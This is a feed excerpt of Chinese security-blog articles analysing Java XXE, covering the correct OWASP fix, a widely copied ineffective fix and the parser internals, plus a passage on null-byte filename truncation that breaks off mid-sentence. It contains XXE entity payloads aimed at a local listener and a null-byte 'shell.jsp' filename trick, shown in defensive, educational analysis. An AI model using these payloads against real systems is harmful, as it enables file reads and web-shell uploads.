    <link href="http://gv7.me/articles/2019/java-xxe-bug-fix-right-and-principle/"/>
    <id>http://gv7.me/articles/2019/java-xxe-bug-fix-right-and-principle/</id>
    <published>2019-02-20T17:18:49.000Z</published>
    <updated>2019-02-20T18:51:57.000Z</updated>
    
    <content type="html"><![CDATA[<p>前两周我们搞明白了XXE漏洞在Java语言中的深层原理，以及错误修复方案为何无法防御XXE的原理。今天我们来解决最后一个问题： <strong>Java中如何正确防御XXE，同时它为何能防御呢？</strong></p><p>OWASP推荐的修复代码如下，号称是可以防御几乎所有XXE攻击！今天我们来深入研究下它为何可以防御XXE漏洞。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br></pre></td></tr></table></figure><h2 id="0x01-测试代码"><a href="#0x01-测试代码" class="headerlink" title="0x01 测试代码"></a>0x01 测试代码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.w3c.dom.Document;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.SAXException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.DocumentBuilder;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.DocumentBuilderFactory;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.ParserConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DOMXXEFix</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ParserConfigurationException,SAXException,Exception</span>&#123;</span><br><span class="line">            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">            dbf.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br><span class="line">            DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line">            String str = <span class="string">"&lt;!DOCTYPE doc [ \n"</span> +</span><br><span class="line">                    <span class="string">"&lt;!ENTITY xxe SYSTEM \"http://127.0.0.1:1664\"&gt;\n"</span> +</span><br><span class="line">                    <span class="string">"]&gt;&lt;doc&gt;&amp;xxe;&lt;/doc&gt;"</span>;</span><br><span class="line">            InputStream is = <span class="keyword">new</span> ByteArrayInputStream(str.getBytes());</span><br><span class="line">            Document doc = db.parse(is);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时使用以下命令,在本地启动一个监听1664端口的Web服务器，用于检测XXE漏洞是否被触发了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 1664</span><br></pre></td></tr></table></figure><h2 id="0x02-原理分析"><a href="#0x02-原理分析" class="headerlink" title="0x02 原理分析"></a>0x02 原理分析</h2><p>在测试代码<code>dbf.setFeature(...);</code>处打断点，开始调式跟踪。</p><p><code>dbf.setFeature()</code>方法会调用多个对象的<code>setFeature()</code>方法，最终到达<code>XMLDocumentScannerImpl</code>对象<code>setFeature()</code>方法，调用链如下：</p><p><img src="/articles/2019/java-xxe-bug-fix-right-and-principle/setFeature_invocation_list.png" alt="setFeature方法调用链"></p><p>在XMLDocumentScannerImpl.setFeature()中，将<code>fDisallowDoctype</code>属性设置为了<code>true</code>。</p><p><img src="/articles/2019/java-xxe-bug-fix-right-and-principle/XMLDocumentScannerImpl_fDisallowDoctype_false.png" alt="fDisallowDoctype属性被设置为true"></p><p>在这些XML解析器完成设置后，解析器会调用<code>XMLDocumentScannerImpl.scanDocument()</code>对XML的文档进行扫描。在解析器读到<code>DOCTYPE</code>字符串时，扫描状态会被设置为<code>SCANNER_STATE_DOCTYPE</code>。解析器会进入<code>SCANNER_STATE_DOCTYPE</code>阶段。</p><p><img src="/articles/2019/java-xxe-bug-fix-right-and-principle/setScannerState_SCANNER_STATE_DOCTYPE.png" alt="扫描状态会被设置为SCANNER_STATE_DOCTYPE"></p><p>该阶段会首先判断<code>fDisallowDoctype</code>的值，由上面的跟踪可知<code>fDisallowDoctype</code>已经被改为<code>true</code>，所以会调用<code>reportFatalError()</code>方法，输出致命错误报告并向上抛出解析异常。</p><p><img src="/articles/2019/java-xxe-bug-fix-right-and-principle/reportFatalError.png" alt="输出致命错误报告并向上抛出解析异常"></p><p>异常会被抛到<code>XML11Configuration.parse()</code>中处理。处理的结果是<code>fParseInProgress</code>变量被设置为了<code>false</code>，接着会调用<code>cleanup()</code>方法在完全解析XML文档之前终止解析，释放解析期间分配的任何资源。所以程序不会运行到漏洞触发处。</p><p><img src="/articles/2019/java-xxe-bug-fix-right-and-principle/fParseInProgress_false.png" alt="终止解析XML"></p><p>最终运行结果如下，Web服务器也并未收到Http请求。</p><p><img src="/articles/2019/java-xxe-bug-fix-right-and-principle/result.png" alt="最终运行结果"></p><h2 id="0x03-参考文章"><a href="#0x03-参考文章" class="headerlink" title="0x03 参考文章"></a>0x03 参考文章</h2><ul><li><a href="https://mp.weixin.qq.com/s/sGcaDCokVxhELd63-0TmIw" target="_blank" rel="noopener">Java XXE注入修复问题填坑实录</a></li><li><a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet" target="_blank" rel="noopener">https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;前两周我们搞明白了XXE漏洞在Java语言中的深层原理，以及错误修复方案为何无法防御XXE的原理。今天我们来解决最后一个问题： &lt;strong&gt;Java中如何正确防御XXE，同时它为何能防御呢？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;OWASP推荐的修复代码如下，号称是可以防御几
      
    
    </summary>
    
      <category term="漏洞原理" scheme="http://gv7.me/categories/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"/>
    
    
      <category term="XXE" scheme="http://gv7.me/tags/XXE/"/>
    
  </entry>
  
  <entry>
    <title>一个被广泛流传的XXE漏洞错误修复方案</title>
    <link href="http://gv7.me/articles/2019/a-widely-circulated-xxe-bug-fix/"/>
    <id>http://gv7.me/articles/2019/a-widely-circulated-xxe-bug-fix/</id>
    <published>2019-02-14T07:09:07.000Z</published>
    <updated>2019-02-20T18:39:59.000Z</updated>
    
    <content type="html"><![CDATA[<p>现在百度”XXE漏洞修复”，搜索到的Java语言修复方案大部分如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(<span class="keyword">false</span>);</span><br></pre></td></tr></table></figure><p>经过实际的测试发现<code>setExpandEntityReferences(false)</code>根本无法防御XXE漏洞！不禁思考到两个问题：</p><ol><li>setExpandEntityReferences为何无法防御XXE？</li><li>为何一个无法防御的方案，却广为流传？</li></ol><p>上一周我们深入Java内置XML解析器中，研究XXE漏洞的深层原理。这周我们在这个基础上，进一步弄清以上两个问题。</p><h2 id="0x01-测试代码"><a href="#0x01-测试代码" class="headerlink" title="0x01 测试代码"></a>0x01 测试代码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.w3c.dom.Document;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.SAXException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.*;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DOMXXETest02</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ParserConfigurationException,SAXException,Exception</span>&#123;</span><br><span class="line">        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">        dbf.setExpandEntityReferences(<span class="keyword">false</span>);</span><br><span class="line">        DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line">        String str = <span class="string">"&lt;!DOCTYPE doc [ \n"</span> +</span><br><span class="line">                        <span class="string">"&lt;!ENTITY xxe SYSTEM \"http://127.0.0.1:1664/test.dtd\"&gt;\n"</span> +</span><br><span class="line">                    <span class="string">"]&gt;&lt;doc&gt;&amp;xxe;&lt;/doc&gt;"</span>;</span><br><span class="line">        InputStream is = <span class="keyword">new</span> ByteArrayInputStream(str.getBytes());</span><br><span class="line">        Document doc = db.parse(is);</span><br><span class="line">        System.out.println(doc.getElementsByTagName(<span class="string">"doc"</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>test.dtd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test by c0ny1</span><br></pre></td></tr></table></figure><h2 id="0x02-原理分析"><a href="#0x02-原理分析" class="headerlink" title="0x02 原理分析"></a>0x02 原理分析</h2><p>我们在<code>dbf.setExpandEntityReferences(false);</code>打断点开始分析！</p><p>setExpandEntityReferences(false)会将DocumentBuilderFactory对象中的expandEntityRef属性默认值true修改为false。</p><p><img src="/articles/2019/a-widely-circulated-xxe-bug-fix/1.png" alt></p><p>在newDocumentBuilder()会方法返回一个DocumentBuilderImpl对象前，会在DocumentBuilderImpl对象初始化时，调用setFeature()方法对DOM解析器的<code>CREATE_ENTITY_REF_NODES_FEATURE</code>(<a href="http://apache.org/xml/features/dom/create-entity-ref-nodes" target="_blank" rel="noopener">http://apache.org/xml/features/dom/create-entity-ref-nodes</a>) 配置项设置为上一步的expandEntityRef变量的相反值true。</p><p><img src="/articles/2019/a-widely-circulated-xxe-bug-fix/2.png" alt></p><p>domParser.setFeature()最终会调用解析器配置对象设置目标配置项的值。</p><p><img src="/articles/2019/a-widely-circulated-xxe-bug-fix/3.png" alt></p><p>在XMLParser对象调用reset()方法重置状态时，AbstractDOMParser对象中通过解析器的配置对象获取到<code>CREATE_ENTITY_REF_NODES</code>（<a href="http://apache.org/xml/features/dom/create-entity-ref-nodes）" target="_blank" rel="noopener">http://apache.org/xml/features/dom/create-entity-ref-nodes）</a> 配置项的值true，并将<code>fCreateEntityRefNodes</code>属性设置为true。</p><p><img src="/articles/2019/a-widely-circulated-xxe-bug-fix/4.png" alt></p><p>在XMLDocumentFragmentScannerImpl.scanDocument()进入<code>START_ELEMENT</code>阶段后，next()方法会对XML中的元素进行扫描。当扫描到文本中的<code>&amp;</code>字符时（识别一般实体），解析器会调用scanEntityReference() 扫描实体引用。最后会调用setupCurrentEntity()创建连接并发起请求，以获取外部实体的内容，这时XXE漏洞将会触发！可以发现程序运行流程，依然会执行到XXE漏洞触发的位置。</p><p><img src="/articles/2019/a-widely-circulated-xxe-bug-fix/5.png" alt></p><p><img src="/articles/2019/a-widely-circulated-xxe-bug-fix/6.png" alt></p><p>继续跟踪，<code>AbstractDOMParser.endGeneralEntity()</code>在判断<code>fCreateEntityRefNodes</code>为<code>false</code>时，实体引用&amp;xxe将会被从DOM树删除，引用的具体内容<code>Test by c0ny1</code>将会在DOM树中展开,替换掉&amp;xxe。此时为<code>true</code>，实体引用节点将保留在DOM树中。这是setExpandEntityReferences方法对XML解析器处理XML最终产生影响的位置。</p><p><img src="/articles/2019/a-widely-circulated-xxe-bug-fix/7.png" alt></p><p>最终调用链如下：</p><p><img src="/articles/2019/a-widely-circulated-xxe-bug-fix/8.png" alt></p><p>经过以上分析，我们大致了解了setExpandEntityReferences()方法的功能是对解析XML生成的Document文档进行设置，设置为 true则展开实体引用到生成的文档中替换掉<code>&amp;xxx</code>的实体引用声明，设置为false则保留实体引用声明的DOM树在生成的文档中。</p><p>由于setExpandEntityReferences(false)对Java内置XML解析器的设置起作用前，解析器就已经发起了对外部实体的请求了，故无法防御XXE漏洞！</p><h2 id="0x03-思考原因"><a href="#0x03-思考原因" class="headerlink" title="0x03 思考原因"></a>0x03 思考原因</h2><p>为何setExpandEntityReferences明明无法防御XXE漏洞，但却很多人在使用呢？当我看了官方JDK API文档之后，发现描述过于简单，从字面上理解很容易与方法的实际功能存在偏差。</p><p><img src="/articles/2019/a-widely-circulated-xxe-bug-fix/9.png" alt></p><p>初步判断有两个原因：</p><ol><li><p>官方文档的描述太过于模糊，很容易让人产生歧义。如果没有跟踪该方法底层实现很容易对它的实际功能理解错误，从而导致错误使用。</p></li><li><p>第一批修复的人应该是看了官方JDK文档来编写修复代码的，之后更多的人是直接百度到了一批人的编写的错误修复代码，直接复制粘贴。导致这个错误的修复方案进一步蔓延。</p></li></ol><h2 id="0x04-参考文章"><a href="#0x04-参考文章" class="headerlink" title="0x04 参考文章"></a>0x04 参考文章</h2><ul><li><a href="https://mp.weixin.qq.com/s/sGcaDCokVxhELd63-0TmIw" target="_blank" rel="noopener">Java XXE注入修复问题填坑实录</a></li><li><a href="https://mp.weixin.qq.com/s/bTeJYzUN9T1u-KDZON5FiQ" target="_blank" rel="noopener">修不好的洞，JDK的坑——从WxJava XXE注入漏洞中发现了一个对JDK的误会</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;现在百度”XXE漏洞修复”，搜索到的Java语言修复方案大部分如下：&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;
      
    
    </summary>
    
      <category term="漏洞原理" scheme="http://gv7.me/categories/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"/>
    
    
      <category term="XXE" scheme="http://gv7.me/tags/XXE/"/>
    
  </entry>
  
  <entry>
    <title>探究Java中XXE漏洞的深层原理</title>
    <link href="http://gv7.me/articles/2019/study-the-deep-principle-of-xxe-vulnerability-in-java/"/>
    <id>http://gv7.me/articles/2019/study-the-deep-principle-of-xxe-vulnerability-in-java/</id>
    <published>2019-02-07T13:30:12.000Z</published>
    <updated>2019-02-16T17:57:27.000Z</updated>
    
    <content type="html"><![CDATA[<p>前段时间微信支付JDK又出现了XXE漏洞，原因是对前一个XXE漏洞没有修复成功。细思深层原因，是因为对Java JDK提供的API函数理解不正确，导致误用函数进行防御。我不禁思考了以下问题:</p><p>1.Java中XXE漏洞的深层原理是什么？</p><p>2.以下代码为何无法防御XXE？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory.setExpandEntityReferences(<span class="keyword">false</span>)</span><br></pre></td></tr></table></figure><p>3.以下代码为何能够防御XXE？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>,<span class="keyword">true</span>)</span><br></pre></td></tr></table></figure><p>要弄清以上问题，我们必须深入到Java内置解析器中去一探究竟。于是我打算从JDK代码层面去跟踪解析器执行的每一步操作。接下来我会用三周的文章弄清这三个问题，本周先来弄清第一个。</p><h2 id="0x01-测试代码"><a href="#0x01-测试代码" class="headerlink" title="0x01 测试代码"></a>0x01 测试代码</h2><p>Java常用解析XML的方式有DOM，SAX，JDOM和DOM4j。我编写了4种方式的XXE漏洞测试代码，运行发现，漏洞触发点都是一样的。</p><p><img src="/articles/2019/study-the-deep-principle-of-xxe-vulnerability-in-java/testcode.png" alt="测试代码"></p><p>说明这4种解析方式底层实现调用的API函数都是一样的。这里我选择DOM这种最常规的方式来举例。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.w3c.dom.Document;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.SAXException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.*;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DOMXXETest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> ParserConfigurationException,SAXException,Exception</span>&#123;</span><br><span class="line">            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">            DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line">            String str = <span class="string">"&lt;!DOCTYPE doc [ \n"</span> +</span><br><span class="line">                    <span class="string">"&lt;!ENTITY xxe SYSTEM \"http://127.0.0.1:1664\"&gt;\n"</span> +</span><br><span class="line">                    <span class="string">"]&gt;&lt;doc&gt;&amp;xxe;&lt;/doc&gt;"</span>;</span><br><span class="line">            InputStream is = <span class="keyword">new</span> ByteArrayInputStream(str.getBytes());</span><br><span class="line">            Document doc = db.parse(is);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以在公众号回复”Java XXE漏洞测试代码”，获取所有测试代码下载地址。</p><h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>随着Java不断的成熟，它内置的解析器也越来越复杂，这里我们只挑和XXE漏洞相关的核心操作来说明。</p><p>由于所有解析方式都调用了XMLParser类来对XML文档进行解析。故我们从该对象的解析函数Parser开始跟踪。</p><p>XMLParser类会调用XML11Configuration类来解析XML文档的配置。而XML11Cofiguration类又会调用XMLDocumentFragmentScannerImpl类的scanDocument()对XML文档片段的结构和内容进行扫描。</p><p><img src="/articles/2019/study-the-deep-principle-of-xxe-vulnerability-in-java/scanDocument.png" alt></p><p>scanDocument方法会先扫描XML的Document部分（START_DOCUMENT阶段），然后在扫描Document中的DTD（DTD阶段），当文档扫描器完成DTD的扫描后，进入<code>START_ELEMENT</code>阶段.</p><p><img src="/articles/2019/study-the-deep-principle-of-xxe-vulnerability-in-java/scanDocument1.png" alt></p><p>这时next()方法会对XML中的元素进行扫描。当扫描到文本中的<code>&amp;</code>字符时（识别一般实体），将状态置为<code>SCANNER_STATE_REFERENCE</code>。</p><p><img src="/articles/2019/study-the-deep-principle-of-xxe-vulnerability-in-java/SCANNER_STATE_REFERENCE.png" alt="将扫描状态改为SCANNER_STATE_REFERENCE"></p><p>在引用扫描状态下，解析器会调用scanEntityReference() 扫描实体引用。</p><p><img src="/articles/2019/study-the-deep-principle-of-xxe-vulnerability-in-java/scanEntityReference.png" alt></p><p>其中将调用XMLEntityManager的startEntity()将应用程序定义的XML实体流插入解析流。</p><p><img src="/articles/2019/study-the-deep-principle-of-xxe-vulnerability-in-java/func_startEntity.png" alt></p><p>最后会调用setupCurrentEntity()创建连接并发起请求，以获取外部实体的内容，这时XXE漏洞将会触发！</p><p><img src="/articles/2019/study-the-deep-principle-of-xxe-vulnerability-in-java/setupCurrentEntity.png" alt="setupCurrentEntity触发XXE漏洞"></p><p>最终调用链如下图所示</p><p><img src="/articles/2019/study-the-deep-principle-of-xxe-vulnerability-in-java/DOMXXETest.png" alt></p><h2 id="0x03-参考文章"><a href="#0x03-参考文章" class="headerlink" title="0x03 参考文章"></a>0x03 参考文章</h2><ul><li><a href="https://github.com/gyyyy/footprint/blob/master/articles/2018/xxe-injection-overview.md" target="_blank" rel="noopener">XXE注入漏洞概述</a></li><li><a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet" target="_blank" rel="noopener">https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;前段时间微信支付JDK又出现了XXE漏洞，原因是对前一个XXE漏洞没有修复成功。细思深层原因，是因为对Java JDK提供的API函数理解不正确，导致误用函数进行防御。我不禁思考了以下问题:&lt;/p&gt;
&lt;p&gt;1.Java中XXE漏洞的深层原理是什么？&lt;/p&gt;
&lt;p&gt;2.以下代
      
    
    </summary>
    
      <category term="漏洞原理" scheme="http://gv7.me/categories/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"/>
    
    
      <category term="XXE" scheme="http://gv7.me/tags/XXE/"/>
    
  </entry>
  
  <entry>
    <title>从代码层面理解java的00截断漏洞深入篇</title>
    <link href="http://gv7.me/articles/2019/java-00-truncation-detail/"/>
    <id>http://gv7.me/articles/2019/java-00-truncation-detail/</id>
    <published>2019-01-22T11:55:10.000Z</published>
    <updated>2019-02-16T18:03:17.000Z</updated>
    
    <content type="html"><![CDATA[<p>4个月前写了一篇文章叫<a href="http://gv7.me/articles/2018/java-00-truncation/">《从代码层面理解java的00截断漏洞》</a>，由于当时出差新疆没时间深入，便在文末立了个有空继续深入的flag。今天我们通过跟踪jdk代码， <strong>彻底搞清楚java中00截断的原理，以及它之后版本是如何修复的？</strong></p><h2 id="一、漏洞测试代码改进"><a href="#一、漏洞测试代码改进" class="headerlink" title="一、漏洞测试代码改进"></a>一、漏洞测试代码改进</h2><p>看了一些java web系统文件上传代码，基本都是使用<code>FileOutputStream</code>来实现对上传内容的保存。于是将上篇文章的测试代码修改如下，简单模拟java的文件上传。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">T2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String filepath = <span class="string">"c://shell.jsp"</span> + (<span class="keyword">char</span>)<span class="number">0</span> + <span class="string">".txt"</span>;</span><br><span class="line">        String content = <span class="string">"Test by c0ny1"</span>;</span><br><span class="line">        System.out.println(filepath);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(filepath);</span><br><span class="line">            fos.write(content.getBytes());</span><br><span class="line">            fos.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过在漏洞版本和非漏洞版本运行以上代码，可知如果00截断成功，则会在系统的c盘根目录新建一个内容为<code>Test by c0ny1</code>的<code>shell.jsp</code>，如果没有截断成功，则抛出<code>Invalid file path</code>异常。</p><h2 id="二、漏洞是如何产生的"><a href="#二、漏洞是如何产生的" class="headerlink" title="二、漏洞是如何产生的?"></a>二、漏洞是如何产生的?</h2><p>我选择使用<code>JDK1.7.0</code>（JDK1.7第一个版本），来跟踪漏洞测试代码从运行到触发。</p><p><img src="/articles/2019/java-00-truncation-detail/vul-01.png" alt="第一个构造函数"></p><p>将传进来的name参数作为路径，新建了File对象，再次传入到<code>FileOutputStream</code>对象新的构造函数。根据传入的两个参数的类型，我们可以确定会进入到以下这个构造函数。</p><p><img src="/articles/2019/java-00-truncation-detail/vul-02.png" alt="第二个构造函数"></p><p>FileOutputStream对象的构造方法又调用了open函数，打开了name参数传进来的文件路径，我们继续跟进open函数。</p><p><img src="/articles/2019/java-00-truncation-detail/vul-03.png" alt="open方法的声明"></p><p>发现open函数是一个native method。它的实现体是由非java语言（c语言）实现的。只能去OpenJDK官网下载jdk源码来查看它的实现。无奈没有找到jdk7u1的源码，只找到了<a href="https://download.java.net/openjdk/jdk7u75/ri/openjdk-7u75-src-b13-18_dec_2014.zip" target="_blank" rel="noopener">jdk7u75</a>的源码。其实在小版本上源码应该区别不大。</p><p>在<code>\openjdk\jdk\src\windows\native\java\io\FileOutputStream_md.c</code>中找到了<code>FileOutputStream</code>类的<code>open</code>方法的JNI实现。open方法又调用了<code>fileOpen</code>方法，继续跟进fileOpen方法。</p><p><img src="/articles/2019/java-00-truncation-detail/vul-04.png" alt="open方法的定义"></p><p>在<code>io_util_md.c</code>中找到了<code>fileOpen</code>方法的定义。</p><p><img src="/articles/2019/java-00-truncation-detail/vul-05.png" alt="fileOpen方法的定义"></p><p>fileOpen方法调用了<code>winFileHandleOpen</code>函数，继续跟进。由于winFileHandleOpen函数代码比较多，这里精简出了关键代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">jlong <span class="title">winFileHandleOpen</span><span class="params">(JNIEnv *env, jstring path, <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">......</span><br><span class="line">    <span class="keyword">if</span> (onNT) &#123; <span class="comment">//如果在Windows NT/Windows 2000操作系统下</span></span><br><span class="line">        WCHAR *pathbuf = pathToNTPath(env, path, JNI_TRUE);</span><br><span class="line">        <span class="keyword">if</span> (pathbuf == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="comment">/* Exception already pending */</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        h = CreateFileW(</span><br><span class="line">            pathbuf,            <span class="comment">/* Wide char path name */</span></span><br><span class="line">            access,             <span class="comment">/* Read and/or write permission */</span></span><br><span class="line">            sharing,            <span class="comment">/* File sharing flags */</span></span><br><span class="line">            <span class="literal">NULL</span>,               <span class="comment">/* Security attributes */</span></span><br><span class="line">            disposition,        <span class="comment">/* creation disposition */</span></span><br><span class="line">            flagsAndAttributes, <span class="comment">/* flags and attributes */</span></span><br><span class="line">            <span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">free</span>(pathbuf);<span class="comment">//创建文件</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        WITH_PLATFORM_STRING(env, path, _ps) &#123;</span><br><span class="line">            h = CreateFile(_ps, access, sharing, <span class="literal">NULL</span>, disposition,flagsAndAttributes, <span class="literal">NULL</span>);<span class="comment">//创建文件</span></span><br><span class="line">        &#125;</span><br><span class="line">        END_PLATFORM_STRING(env, _ps);</span><br><span class="line">    &#125;</span><br><span class="line">......</span><br><span class="line">    <span class="keyword">return</span> (jlong)h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过阅读以上代码，可知如果在Windows NT/Windows 2000平台下会调用<code>pathToNTPath</code>函数将原始文件路径转化为Windows 